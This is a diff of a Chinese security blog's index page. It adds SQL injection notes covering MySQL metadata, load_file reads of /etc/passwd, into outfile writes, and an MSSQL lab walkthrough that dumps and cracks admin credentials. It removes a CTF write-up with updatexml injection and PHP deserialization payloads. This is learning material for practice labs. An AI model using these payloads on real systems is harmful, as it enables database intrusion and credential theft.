@@ -73,6 +73,165 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Web-SQLi2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/01/Web-SQLi2/" class="article-date">
+  <time class="dt-published" datetime="2024-02-01T09:26:10.000Z" itemprop="datePublished">2024-02-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/02/01/Web-SQLi2/">SQLi2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="SQL注入-MySQL注入"><a href="#SQL注入-MySQL注入" class="headerlink" title="SQL注入 MySQL注入"></a>SQL注入 MySQL注入</h4><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/64b6f726-17c5-427d-8e92-33beca6bb4b6" alt="image">  </p>
+<h5 id="一、information-schema"><a href="#一、information-schema" class="headerlink" title="一、information_schema"></a>一、information_schema</h5><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</p>
+<p>information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p>
+<ul>
+<li><strong>SCHEMATA表</strong></li>
+</ul>
+<p>当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据</p>
+<p>获取到数据库名称</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use information_schema;</span><br><span class="line">mysql&gt; <span class="keyword">select</span> SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;</span><br><span class="line">+--------------------+----------------------------+</span><br><span class="line">| SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME |</span><br><span class="line">+--------------------+----------------------------+</span><br><span class="line">| information_schema | utf8                       |</span><br><span class="line">| challenges         | gbk                        |</span><br><span class="line">| mysql              | latin1                     |</span><br><span class="line">| performance_schema | utf8                       |</span><br><span class="line">| security           | gbk                        |</span><br><span class="line">+--------------------+----------------------------+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>TABLES 表</li>
+</ul>
+<p>存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables <span class="built_in">limit</span> 0,5;</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                            |</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">| def           | information_schema | CHARACTER_SETS                        |</span><br><span class="line">| def           | information_schema | COLLATIONS                            |</span><br><span class="line">| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| def           | information_schema | COLUMNS                               |</span><br><span class="line">| def           | information_schema | COLUMN_PRIVILEGES                     |</span><br><span class="line">+---------------+--------------------+---------------------------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>COLUMNS 表</li>
+</ul>
+<p>存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5;</span><br><span class="line">+---------------+--------------------+----------------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME     |</span><br><span class="line">+---------------+--------------------+----------------+</span><br><span class="line">| def           | information_schema | CHARACTER_SETS |</span><br><span class="line">| def           | information_schema | CHARACTER_SETS |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">| def           | information_schema | COLLATIONS     |</span><br><span class="line">+---------------+--------------------+----------------+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>USER_PRIVILEGES 表</li>
+</ul>
+<p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM USER_PRIVILEGES <span class="built_in">limit</span> 0,5;</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">| GRANTEE            | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | SELECT         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | INSERT         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | UPDATE         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | DELETE         | YES          |</span><br><span class="line">| <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> | def           | CREATE         | YES          |</span><br><span class="line">+--------------------+---------------+----------------+--------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">load_file()：读取函数</span><br><span class="line">into outfile或into dumpfile：导出函数</span><br><span class="line">路径获取常见方法：</span><br><span class="line">报错显示，遗留文件，漏洞报错，平台配置文件，爆破等</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line">-1 union select 1,load_file(&#x27;文件路径&#x27;),3</span><br><span class="line">写入文件</span><br><span class="line">-1 union select 1,&#x27;x&#x27;,3 into outfile &#x27;文件路径&#x27;--+</span><br><span class="line">文件路径符号用/，如果是\，要写成\\</span><br><span class="line"></span><br><span class="line">常见文件读取列表：</span><br><span class="line"></span><br><span class="line">常见文件写入问题：魔术引号开关</span><br><span class="line">magic_quotes_gpc</span><br><span class="line"></span><br><span class="line">魔术引号及常见防护</span><br><span class="line"></span><br><span class="line">低版本注入配合读取或暴力</span><br><span class="line">字典或读取</span><br><span class="line"></span><br><span class="line">SQL语句干扰符号：&#x27; &quot; % ) &#125; 等，具体看写法</span><br></pre></td></tr></table></figure>
+
+<p>参考地址：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p>
+<p>load_file						文件读取</p>
+<p>into outfile 或into dumpfile		文件写入</p>
+<p>查询是否有写入的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;%secure_file_priv%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NULL</td>
+<td>不允许导入或导出</td>
+</tr>
+<tr>
+<td>&#x2F;tmp</td>
+<td>只允许在 &#x2F;tmp 目录导入导出</td>
+</tr>
+<tr>
+<td>空</td>
+<td>不限制目录</td>
+</tr>
+</tbody></table>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+<ul>
+<li>文件读取</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>): root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/false</span><br><span class="line">mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line"></span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR:</span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取敏感信息：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p>
+<p>如果存在过滤，比如说，把select替换为fuck，可以使用大写绕过过滤，写为Select，mysql对关键字大小写不敏感</p>
+<p>select  * from user where name like ‘%qyw%’</p>
+<p>那么前面带qyw或者后面带qyw的都会被搜出来</p>
+<p>值传递的方式，get，post，cookie，request</p>
+<p>cookie提交方式，抓包，添加数据</p>
+<p>Cookie: 参数&#x3D;参数值</p>
+<p>request是全部接受，用get，post或cookie都可以接受，我们大部分是黑盒测试，不知道对方代码是怎么写的，所以不知道接收数据时采用的是什么方法，如果采用的是request，那随便提交，如果是单一的，在注入时要使用到一些方法，有一些可以修改绕过提交方式</p>
+<p>server提交方式，可以获取浏览器的一些值<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangshuazi/p/9765012.html">$_SERVER详解 - 刷哥 - 博客园 (cnblogs.com)</a></p>
+<h5 id="json注入"><a href="#json注入" class="headerlink" title="json注入"></a>json注入</h5><p>提交的时候写成这种</p>
+<p>…</p>
+<p>{</p>
+<p>​	“username”:”admin”,</p>
+<p>​	“password”:”123456”</p>
+<p>}</p>
+<p>或者直接抓个包，按那种格式提交数据</p>
+<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f61f381e-2c5b-4b0f-ac1d-a6e4b2c6561c" alt="image"></p>
+<h5 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">数据库类型：Access、MySQL、SQL server、</span><br><span class="line">结构</span><br><span class="line">access</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br><span class="line">MySQL等</span><br><span class="line">	数据库名</span><br><span class="line">		表名</span><br><span class="line">			列名</span><br><span class="line">				数据</span><br><span class="line">我们进行sql注入时，用到的权限是由连接数据库的用户权限决定的</span><br><span class="line">access数据库在进行注入时，不需要union select，因为它只有一个数据库，直接查询信息就行，它也没有收集数据库名信息，表名信息的表，所以在就行注入时，就只能进行暴力猜</span><br><span class="line">1、判断有几列</span><br><span class="line">2、暴力猜</span><br><span class="line"></span><br><span class="line">遗留问题：</span><br><span class="line">access注入时，暴力破解如果列名或表名猜解不到</span><br></pre></td></tr></table></figure>
+
+<h5 id="MSSQL（SQL-server）注入"><a href="#MSSQL（SQL-server）注入" class="headerlink" title="MSSQL（SQL server）注入"></a>MSSQL（SQL server）注入</h5><p>MSSQL注入 </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p>
+<p>例题为墨者学堂 SQL手工注入漏洞测试(Sql Server数据库)</p>
+<p>解题步骤：</p>
+<p><strong>1、判断是否是MSSQL</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）</span><br><span class="line">and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈</span><br></pre></td></tr></table></figure>
+
+<p>sysobjects是sql server独有的一个数据库</p>
+<p><strong>2、判断数据库版本</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=@@version--这个语句要在有回显的模式下才可以哦</span><br><span class="line">and substring((select @@version),22,4)=&#x27;2005&#x27;--适用于无回显模式，后面的2005就是数据库版本，返回正常就是2005的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是2005的话就返回正常）</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、判断回显</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由于题目中3是字符类型，所以要加引号</span><br><span class="line">?id=-2 union all select 1,2,&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>
+
+<p><strong>4、数据库名称</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,db_name(),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名称为 mozhe_db_v2</p>
+<p><strong>5、爆表</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#x27;u&#x27;),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>
+
+<p>当xtype&#x3D;’U’ 代表是用户建立的表</p>
+<p>得到表名为manage</p>
+<p><strong>6、爆字段</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),1) from sysobjects),&#x27;3&#x27;,4</span><br></pre></td></tr></table></figure>
+
+<p>解释一下col_name()，与object（）</p>
+<p>object ()：数据库中每个对象都有一个唯一的id值，object_id(name)可以根据表对象名称得到表对象的ID，object_id()只能返回用户创建的对像的ID,像以sys开头的表都是系统表所以返回不了的</p>
+<p>col_name（）：可以根据id值得到对像的名称，而且可以返回指定下标的结果.</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),2) from sysobjects),&#x27;3&#x27;,4 得username</span><br><span class="line"></span><br><span class="line">?id=-2 union all select 1,(select top 1 col_name(object_id(&#x27;manage&#x27;),3) from sysobjects),&#x27;3&#x27;,4 得password</span><br></pre></td></tr></table></figure>
+
+<p>说明mange表总共有3列，分别为：id、username、password</p>
+<p><strong>7、爆数据</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union all select 1,(select username from manage) ,(select password from manage where username in (&#x27;admin_mz&#x27;)),4</span><br></pre></td></tr></table></figure>
+
+<p>得到username为admin_mz</p>
+<p>password为72e1bfc3f01b7583，MD5解密，password为97285101</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/01/Web-SQLi2/" data-id="cls43dxy50000rkvfanov8qc7" data-title="SQLi2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-20240131" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/01/31/20240131/" class="article-date">
@@ -1037,122 +1196,11 @@
 
 
   
-    <article id="post-Buuctf Web（25-28）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2023-08-12T12:53:48.000Z" itemprop="datePublished">2023-08-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/">Buuctf Web（25-28）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h3 id="Buuctf-Web（25-28）"><a href="#Buuctf-Web（25-28）" class="headerlink" title="Buuctf Web（25-28）"></a>Buuctf Web（25-28）</h3><h4 id="25、HardSQL"><a href="#25、HardSQL" class="headerlink" title="25、HardSQL"></a>25、HardSQL</h4><p>一些and、union、select、空格等常见的SQL语句被过滤了</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">这道题是xpath报错注入，函数注入</span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line">extractvalue() :对XML文档进行查询的函数</span><br><span class="line"></span><br><span class="line">语法：extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">第一个参数 :   第一个参数可以传入目标xml文档</span><br><span class="line"></span><br><span class="line">第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</span><br><span class="line"></span><br><span class="line">　　　　　　正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错</span><br><span class="line"></span><br><span class="line">tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如right(),left()，substr()来截取字符串</span><br><span class="line"></span><br><span class="line">再举个栗子：</span><br><span class="line"></span><br><span class="line">SELECT ExtractValue(&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;, &#x27;/a/b&#x27;); 这个语句就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</span><br><span class="line"></span><br><span class="line">利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。</span><br></pre></td></tr></table></figure>
-
-<p>输入用户名：<code>1</code></p>
-<p>密码：<code>1&#39;or&#39;1&#39;=&#39;1</code></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/40172d44-3758-4a26-be49-45c7087c0dbc" alt="image"></p>
-<p>出现这段话，并且url加上了&#x2F;check.php</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae5611e0-f140-4525-af9f-049d55033cce" alt="image"></p>
-<p>爆库名：<code>?username=admin&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=111</code></p>
-<p>geek</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73ca09b1-1eb7-4fd3-ab8a-3b4a4ab60464" alt="image"></p>
-<p>爆表名：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27)),0x7e),1))%23&amp;password=111</code></p>
-<p>H4rDsq1</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f0bb9dd2-c888-4015-8365-e30b0fab3422" alt="image"></p>
-<p>爆字段：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27)),0x7e),1))%23&amp;password=111</code></p>
-<p>id,username,password</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/dc636dd7-18e8-41b5-ac79-d1cdd9ddb8ae" alt="image"></p>
-<p>爆数据：<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
-<p>flag{52272770-1ba7-4986-8a7d-cb</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/25ed0a2d-a386-4f5a-a67b-ec2fe58b275a" alt="image"></p>
-<p>这里只爆出前面一部分flag，然后再使用right()函数拼接flag<code>?username=admin&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=111</code></p>
-<p>7-4986-8a7d-cb84363e2987}</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/735591d7-7347-4231-8cf4-8e214d661a5c" alt="image"></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;52272770-1ba7-4986-8a7d-cb84363e2987&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="26、Ez-bypass"><a href="#26、Ez-bypass" class="headerlink" title="26、Ez_bypass"></a>26、Ez_bypass</h4><p>这是一段php代码</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6025af10-9590-4393-a0ae-93aa16f18a7a" alt="image"></p>
-<p>查看源码，得到易读的格式</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3be50c4c-0313-43b5-92a2-760dd9124563" alt="image"></p>
-<p>分析代码</p>
-<p>第一步</p>
-<p>首先用get方式传入id和gg</p>
-<p><code>md5($id)===md5($gg)</code>数组绕过：id[]&#x3D;a&amp;gg[]&#x3D;b，最后可能会报错，但是<code>null=null</code>，判断为true，成功绕过</p>
-<p>构造payload：<code>/?id[]=a&amp;gg[]=b</code></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8cce0fe7-5a49-4fef-8dc9-e6bc1d8a1d22" alt="image"></p>
-<p> 第二步</p>
-<p>用post方法传入passwd，passwd不是数字和数字字符串，但是passwd值为1234567</p>
-<p><code>is_numeric() </code>用于检测变量是否为数字或数字字符串</p>
-<p>所以passwd为1234567a</p>
-<p>用插件实现post传参</p>
-<p>构造payload：<code>passwd=1234567a</code></p>
-<p>得到flag</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b387b0b-34b7-47d7-a4f3-da0541b41645" alt="image"></p>
-<p>关于md5的总结<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52923241/article/details/119669647">【CTF】关于md5总结_ctf md5_吃_早餐的博客-CSDN博客</a></p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e2f8945c-0443-493c-8023-304121617ba8&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="27、AreUSerialz"><a href="#27、AreUSerialz" class="headerlink" title="27、AreUSerialz"></a>27、AreUSerialz</h4><p>代码审计：op变量使用强类型比较&#x3D;&#x3D;&#x3D;判断this-&gt;op的值是否等于字符串2，如果等于，则将其置为1。在process()方法中，使用弱类型比较&#x3D;&#x3D;判断op的值是否对等于字符串2，若为真，则执行read()方法与output()方法。在read()方法中，使用file_get_contents()函数来读取属性filename路径的文件。</p>
-<p>编造序列化（利用public属性序列化，绕过is_valid()函数）</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler&#123;</span><br><span class="line">	public $op = 2;</span><br><span class="line">	public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">	public $content;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new FileHandler();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>得到序列化结果为</p>
-<p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code><br><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ca844239-9ab4-495a-8dca-990e712adf01" alt="image"></p>
-<p>构造payload：<code>/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
-<p>得到一串base64编码</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/15c04760-6a23-41d4-83f6-dd8f478eb394" alt="image"></p>
-<p>解码后得到flag</p>
